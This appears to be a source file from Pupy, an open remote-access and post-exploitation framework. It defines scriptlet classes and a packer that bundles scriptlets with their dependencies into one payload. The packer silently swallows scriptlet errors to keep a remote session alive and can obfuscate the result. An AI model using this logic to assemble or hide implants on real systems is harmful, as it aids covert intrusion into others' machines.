#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import os, os.path
from pupylib.payloads  import dependencies
from pupylib.utils.obfuscate import compress_encode_obfs

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__),"..","packages"))

def wrap_try_except(code):
    full_code = "try:\n"
    for line in code.split("\n"):
            full_code += "\t"+line+"\n"
    full_code += "except Exception:\n\tpass\n"
    return full_code

class ScriptletArgumentError(Exception):
    pass

class Scriptlet(object):
    """ Default pupy scriptlet. This description needs to be overriden to describe the scriptlet """
    dependencies=[]
    arguments={}

    def generate(self, *args, **kwargs):
        """ this method is meant to be overriden """
        raise NotImplementedError()

    @classmethod
    def print_help(cls):
        print cls.get_help()

    @classmethod
    def get_help(cls):
        res=("\tdescription : %s\n"%cls.__doc__)
        if cls.arguments:
            res+=("\targuments   : \n")
            for arg, desc in cls.arguments.iteritems():
                res+="\t\t\t{:<10} : {}\n".format(arg, desc)
        else:
            res+=("\targuments   : \n")
            res+="\t\t\t{:<10}\n".format("no arguments")
        return res


class ScriptletsPacker(object):
    def __init__(self, os=None, arch=None, debug=False, obfuscate=False):
        self.scriptlets = set()
        self.debug = debug
        self.os = os or 'all'
        self.arch = arch
        self.obfuscate = obfuscate

    def add_scriptlet(self, sl):
        self.scriptlets.add(sl)

    def pack(self):
        fullpayload = []

        requirements = set()

        for scriptlet in self.scriptlets:
            if type(scriptlet.dependencies) == dict:
                for dependency in scriptlet.dependencies.get('all', []):
                    requirements.add(dependency)

                for dependency in scriptlet.dependencies.get(self.os, []):
                    requirements.add(dependency)
            else:
                for dependency in scriptlet.dependencies:
                    requirements.add(dependency)

        if requirements:
            try:
                fullpayload += [
                    'import pupyimporter',
                    dependencies.importer(requirements, os=self.os)
                ]
            except dependencies.NotFoundError, e:
                raise ImportError('Module "{}" not found'.format(e))


        for scriptlet in self.scriptlets:
            if self.debug:
                fullpayload.append(scriptlet.generate(self.os))
            else:
                #if not in debug mode, catch all exception to continue an have a session if a scriptlet raises an exception
                fullpayload.append(wrap_try_except(scriptlet.generate(self.os)))

        fullpayload = '\n'.join(fullpayload)
        if self.obfuscate:
            fullpayload = compress_encode_obfs(fullpayload)

        return fullpayload
